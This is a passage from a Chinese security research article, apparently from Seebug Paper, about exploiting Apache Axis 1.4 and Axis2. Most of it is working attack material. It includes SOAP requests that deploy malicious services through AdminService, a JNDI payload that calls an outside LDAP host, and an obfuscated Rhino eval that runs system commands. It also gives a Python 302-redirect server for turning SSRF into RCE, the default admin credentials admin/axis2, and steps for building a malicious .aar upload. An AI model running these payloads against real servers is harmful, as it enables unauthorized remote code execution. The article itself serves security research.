通过get或post请求部署完成后，访问刚才部署的service并调用它的getService方法，传入jndi链接即可：

    
    
    POST /axis/services/ServiceFactoryService HTTP/1.1
    Host: 127.0.0.1:8080
    Content-Type: text/xml; charset=utf-8
    Accept: application/soap+xml, application/dime, multipart/related, text/*
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
    SOAPAction: ""
    Content-Length: 891
    
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://client.axis.apache.org">
       <soapenv:Header/>
       <soapenv:Body>
          <cli:getService soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
             <environment xsi:type="x-:Map" xs:type="type:Map" xmlns:x-="http://xml.apache.org/xml-soap" xmlns:xs="http://www.w3.org/2000/XMLSchema-instance">
                <!--Zero or more repetitions:-->
                <item xsi:type="x-:mapItem" xs:type="type:mapItem">
                   <key xsi:type="xsd:anyType">jndiName</key>
                   <value xsi:type="xsd:anyType">ldap://xxx.xx.xx.xxx:8888/Exploit</value>
                </item>
             </environment>
          </cli:getService>
       </soapenv:Body>
    </soapenv:Envelope>

**缺陷：** 如果设置了不允许远程加载JNDI Factory，就不能用了

###### 1.4.1.3 com.sun.script.javascript.RhinoScriptEngine service

post请求：

    
    
    POST /axis/services/AdminService HTTP/1.1
    Host: 127.0.0.1:8080
    Content-Type: text/xml; charset=utf-8
    Accept: application/soap+xml, application/dime, multipart/related, text/*
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
    SOAPAction: ""
    Content-Length: 905
    
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" >
      <soap:Body>
        <deployment
          xmlns="http://xml.apache.org/axis/wsdd/"
          xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
            <service name="RhinoScriptEngineService" provider="java:RPC">
              <parameter name="className" value="com.sun.script.javascript.RhinoScriptEngine" />
              <parameter name="allowedMethods" value="eval" />
    <typeMapping deserializer="org.apache.axis.encoding.ser.BeanDeserializerFactory"
                         type="java:javax.script.SimpleScriptContext"
                         qname="ns:SimpleScriptContext"
                         serializer="org.apache.axis.encoding.ser.BeanSerializerFactory"
                         xmlns:ns="urn:beanservice" regenerateElement="false">
            </typeMapping>
            </service>
        </deployment>
      </soap:Body>
    </soap:Envelope>

get请求：

    
    
    GET /axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22RhinoScriptEngineService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22com.sun.script.javascript.RhinoScriptEngine%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22eval%22%20%2F%3E%3CtypeMapping%20deserializer%3D%22org.apache.axis.encoding.ser.BeanDeserializerFactory%22%20type%3D%22java%3Ajavax.script.SimpleScriptContext%22%20qname%3D%22ns%3ASimpleScriptContext%22%20serializer%3D%22org.apache.axis.encoding.ser.BeanSerializerFactory%22%20xmlns%3Ans%3D%22urn%3Abeanservice%22%20regenerateElement%3D%22false%22%3E%3C%2FtypeMapping%3E%3C%2Fservice%3E%3C%2Fdeployment HTTP/1.1
    Host: 127.0.0.1:8080
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache

通过get或post请求部署完成后，访问刚才部署的service并调用它的eval方法，还可以回显：

    
    
    POST /axis/services/RhinoScriptEngineService HTTP/1.1
    Host: 127.0.0.1:8080
    Content-Type: text/xml; charset=utf-8
    Accept: application/soap+xml, application/dime, multipart/related, text/*
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
    SOAPAction: ""
    Content-Length: 866
    
    <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com"><soapenv:Body><eval xmlns="http://127.0.0.1:8080/services/scriptEngine"><arg0 xmlns="">
    <![CDATA[function test(){    var cmd1 = 'c';    cmd1 += 'm';    cmd1 += 'd';    cmd1 += '.';    cmd1 += 'e';    cmd1 += 'x';    cmd1 += 'e';    var cmd2 = '/';    cmd2 += 'c';    var pb = new java.lang.ProcessBuilder(cmd1,cmd2,'whoami');    var process = pb.start();    var ret = new java.util.Scanner(process.getInputStream()).useDelimiter('\\A').next();    return ret;}   test();]]></arg0><arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
    </arg1></eval></soapenv:Body></soapenv:Envelope>

**缺陷：**
jdk7及之前的版本可以用，之后的版本就不是这个ScriptEngine类了，取代他的是NashornScriptEngine，但是这个NashornScriptEngine不能利用。

###### 1.4.1.4 说明

如果是白盒其实很容易找到很好用的利用类，在jdk中利用lookup的恶意类其实也很多，即使你碰到的环境是jdk8以上，jsp不解析，jndi也被禁用，但是应用依赖的三方包中依然存在很多可利用的恶意类，例如通过下面的关键词简单搜索筛选下也应该能找到一些：

    
    
    Runtime.getRuntime()
    new ProcessBuilder(
    .eval(
    .exec(
    new FileOutputStream(
    .lookup(
    .defineClass(
    ...

如果经常黑盒可以收集一些使用量较大的三方包中能利用的恶意类。

另一个问题就是作为恶意Bean的构造器选择问题，来看demo示例一个java.io.File作为参数的例子，这里直接在wsdd中配置HelloWorld
Service演示了，配置如下就行：

    
    
    <typeMapping languageSpecificType="java:java.io.File" qname="xxx:FileBean" xmlns:xxx="urn:FileBeanManager"
                         serializer="org.apache.axis.encoding.ser.BeanSerializerFactory"
                         deserializer="org.apache.axis.encoding.ser.BeanDeserializerFactory"
                         encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            </typeMapping>

然后在HelloWord类中，写个测试方法，`public boolean saveFile(File file, byte[] bytes)
{`将File类作为参数，下面用soap ui来测试下：
![](https://images.seebug.org/content/images/2021/02/d8becaaf-1a23-4bd7-9671-492c96aa8fa8.png-w331s)

下面是File构造器的选择，在1.2.6.1小节也说到了这个问题，感觉是个设计缺陷，这里construtors的第一个是两个String参数的构造器：

![](https://images.seebug.org/content/images/2021/02/26/1614308878000-7.png-w331s)

然后在org.apache.axis.encoding.ConstructorTarget#set通过构造器赋值，这里也是一个设计缺陷：

![](https://images.seebug.org/content/images/2021/02/26/1614308878000-8.png-w331s)

我传入的值分别为./和test.jsp，但是经过他的处理后args变成了./和./，接下来到example.HelloWorld#saveFile去看看值：

![](https://images.seebug.org/content/images/2021/02/26/1614308878000-9.png-w331s)

可以看到File的值为`./.`导致不存在而错误，再假设传入的值为./webapps/ROOT/test.jsp把，到这里就会变成./webapps/ROOT/test.jsp/webapps/ROOT/test.jsp还是不存在而错误。

所以寻找Bean这种作为参数的恶意类有时候会因为Axis的这些设计问题导致不一定能利用。

##### 1.4.2 利用AdminService + SSRF进行未授权RCE

由于AdminService只能localhost访问，一般来说，能进行post请求的ssrf不太可能，所以一般利用ssrf进行get请求来部署恶意服务，只需要找到一个ssrf即可rce。

在demo示例项目中，我添加了一个SSRFServlet，并且不是请求完成的url，而是解析出协议,ip，port重新组合再请求，这里这么模拟只是为了模拟更严苛环境下，依然可以利用重定向来利用这个漏洞，大多时候http的请求类默认应该是支持重定向的。用上面的RhinoScriptEngine作为恶意类来模拟。

302服务器：

    
    
    import logging
    import random
    import socket
    import sys
    import threading
    import time
    from http.server import SimpleHTTPRequestHandler, HTTPServer
    
    logger = logging.getLogger("Http Server")
    logger.addHandler(logging.StreamHandler(sys.stdout))
    logger.setLevel(logging.INFO)
    
    
    class HTTPServerV4(HTTPServer):
        address_family = socket.AF_INET
    
    
    class MHTTPServer(threading.Thread):
        def __init__(self, bind_ip='0.0.0.0', bind_port=666, requestHandler=SimpleHTTPRequestHandler):
            threading.Thread.__init__(self)
            self.bind_ip = bind_ip
            self.bind_port = int(bind_port)
            self.scheme = 'http'
            self.server_locked = False
            self.server_started = False
            self.requestHandler = requestHandler
            self.httpserver = HTTPServerV4
            self.host_ip = self.get_host_ip()
    
            self.__flag = threading.Event()
            self.__flag.set()
            self.__running = threading.Event()
            self.__running.set()
    
        def check_port(self, ip, port):
            res = socket.getaddrinfo(ip, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
            af, sock_type, proto, canonname, sa = res[0]
            s = socket.socket(af, sock_type, proto)
    
            try:
                s.connect(sa)
                s.shutdown(2)
                return True
            except:
                return False
            finally:
                s.close()
    
        def get_host_ip(self):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(('8.8.8.8', 80))
                ip = s.getsockname()[0]
            except Exception:
                ip = '127.0.0.1'
            finally:
                s.close()
    
            return ip
    
        def start(self, daemon=True):
            if self.server_locked:
                logger.info(
                    'Httpd serve has been started on {}://{}:{}, '.format(self.scheme, self.bind_ip, self.bind_port))
                return
    
            if self.check_port(self.host_ip, self.bind_port):
                logger.error('Port {} has been occupied, start Httpd serve failed!'.format(self.bind_port))
                return
    
            self.server_locked = True
            self.setDaemon(daemon)
            threading.Thread.start(self)
            detect_count = 10
            while detect_count:
                try:
                    logger.info('Detect {} server is runing or not...'.format(self.scheme))
                    if self.check_port(self.host_ip, self.bind_port):
                        break
                except Exception as ex:
                    logger.error(str(ex))
                time.sleep(random.random())
                detect_count -= 1
    
        def run(self):
            try:
                while self.__running.is_set():
                    self.__flag.wait()
                    if not self.server_started:
                        self.httpd = self.httpserver((self.bind_ip, self.bind_port), self.requestHandler)
                        logger.info("Starting httpd on {}://{}:{}".format(self.scheme, self.bind_ip, self.bind_port))
                        thread = threading.Thread(target=self.httpd.serve_forever)
                        thread.setDaemon(True)
                        thread.start()
                        self.server_started = True
                self.httpd.shutdown()
                self.httpd.server_close()
                logger.info('Stop httpd server on {}://{}:{}'.format(self.scheme, self.bind_ip, self.bind_port))
            except Exception as ex:
                self.httpd.shutdown()
                self.httpd.server_close()
                logger.error(str(ex))
    
        def pause(self):
            self.__flag.clear()
    
        def resume(self):
            self.__flag.set()
    
        def stop(self):
            self.__flag.set()
            self.__running.clear()
            time.sleep(random.randint(1, 3))
    
    
    class Http302RequestHandler(SimpleHTTPRequestHandler):
        location = ""
    
        def do_GET(self):
            status = 302
    
            self.send_response(status)
            self.send_header("Content-type", "text/html")
            self.send_header("Content-Length", "0")
            self.send_header("Location", Http302RequestHandler.location)
            self.end_headers()
    
    
    if __name__ == '__main__':
        Http302RequestHandler.location = "http://127.0.0.1:8080/axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22RhinoScriptEngineService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22com.sun.script.javascript.RhinoScriptEngine%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22eval%22%20%2F%3E%3CtypeMapping%20deserializer%3D%22org.apache.axis.encoding.ser.BeanDeserializerFactory%22%20type%3D%22java%3Ajavax.script.SimpleScriptContext%22%20qname%3D%22ns%3ASimpleScriptContext%22%20serializer%3D%22org.apache.axis.encoding.ser.BeanSerializerFactory%22%20xmlns%3Ans%3D%22urn%3Abeanservice%22%20regenerateElement%3D%22false%22%3E%3C%2FtypeMapping%3E%3C%2Fservice%3E%3C%2Fdeployment"
        httpd = MHTTPServer(bind_port=8888, requestHandler=Http302RequestHandler)
        httpd.start(daemon=True)
    
        while True:
            time.sleep(100000)

启动302服务器，访问<http://yourip:8080/axis/SSRFServlet?url=http://evilip:8888/>

使用SSRFServlet请求302服务器并重定向到locaohost进行部署服务。

### 2\. Apache Axis2

Apache Axis2是Web服务/ SOAP / WSDL引擎，是广泛使用的[Apache
Axis1](http://ws.apache.org/axis/)
SOAP堆栈的后继者。与[Axis1.x架构](http://ws.apache.org/axis/java/architecture-guide.html)相比，Axis2所基于的新架构更加灵活，高效和可配置。新体系结构中保留了一些来自Axis 1.x的完善概念，例如处理程序等。

#### 2.1 搭建Axis2项目

##### 2.1.1 使用idea搭建Axis2

从Axis2官网下载[war](http://www.apache.org/dyn/closer.lua/axis/axis2/java/core/1.7.9/axis2-1.7.9-war.zip)包，解压war包之后将axis2-web和WEB-INF复制到项目的web目录下，结构如下：

![](https://images.seebug.org/content/images/2021/02/26/1614308878000-10.png-w331s)

然后可以在services目录下配置自己的service服务，部署到tomcat即可。项目demo放在了[github](https://github.com/longofo/ApacheAxis2VulDemo)

##### 2.1.2 访问WebService

如果按照上面步骤搭建的项目，访问首页之后会出现如下页面：

![](https://images.seebug.org/content/images/2021/02/26/1614308878000-11.png-w331s)

访问/axis2/services/listServices会出现所有已经部署好的web
services（Axis2不能像Axis1那样用直接访问/services/或用?list列出services了）。

#### 2.2 Axis2与Axis1配置文件的变化

##### 2.2.1 axis2.xml全局配置文件

在Axis1的全局配置和service配置都在server-config.wsdd中配置。但是Axis2的全局配置单独放到了axis2.xml中，下面说下和后面漏洞利用有关的两个配置：

![](https://images.seebug.org/content/images/2021/02/26/1614308878000-12.png-w331s)

配置了允许部署.aar文件作为service，.aar就是个压缩包文件，里面包含要部署的类和services.xml配置信息，官方默认也给了一个version-1.7.9.aar示例。

另一个配置是axis2-admin的默认登陆账号和密码，登陆上去之后可以上传.aar部署恶意service。

![](https://images.seebug.org/content/images/2021/02/26/1614308878000-13.png-w331s)

##### 2.2.2 services.xml

Axis2的service配置改为了在WEB-INF/services目录下配置，Axis2会扫描该目录下的所有xxx/META-INF/services.xml和services.list文件：

![](https://images.seebug.org/content/images/2021/02/26/1614308878000-14.png-w331s)

##### web.xml

Axis1中从web端部署service使用的是AdminService，在Axis2中改成了使用`org.apache.axis2.webapp.AxisAdminServlet`，在web.xml中配置：

![](https://images.seebug.org/content/images/2021/02/26/1614308878000-15.png-w331s)

#### 2.3 Axis2的漏洞利用

利用主要还是有两种：

  * 暴露在外部的web service能直接调用造成危害

  * 从上面的配置文件我们也可以看到，可以使用axis2-admin来部署.arr文件，.arr文件可以写入任意恶意的class文件，默认账号admin/axis2，不需要像axis1那样寻找目标服务器存在的class

利用axis2-admin上传.arr：

![](https://images.seebug.org/content/images/2021/02/26/1614308879000-16.png-w331s)

.arr文件的制作可以仿照version-1.7.9.aar，如下结构即可：

    
    
    META-INF
        services.xml(将ServiceClass配置成test.your即可)
    test
        your.class

#### 2.4 Axis2非默认配置的情况

上面的项目是直接复制了官方所有的配置文件，所以访问首页有官方给出的页面，以及axis2-admin，axis2-admin的AxisAdminServlet类不在官方的jar包中，只是在classes目录下，也就是说axis2-admin也是demo的一部分。如果不需要官方的那些东西的时候，axis2-admin的方式利用就不行了，但是也是能正常调用其他service的，项目结构如下：

![](https://images.seebug.org/content/images/2021/02/26/1614308879000-17.png-w331s)

此时访问http://127.0.0.1:8080/axis2/services/listServices会变成500，看下服务端的报错：

![](https://images.seebug.org/content/images/2021/02/26/1614308879000-18.png-w331s)

listServices.jsp找不到，之前能调用listServices是因为用了官方的demo。

但是直接访问service是正常的并且可以调用：

![](https://images.seebug.org/content/images/2021/02/26/1614308879000-19.png-w331s)

这种情况下，如果是黑盒就不太好办了，看不到service，只能暴力猜解service name。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1489/>

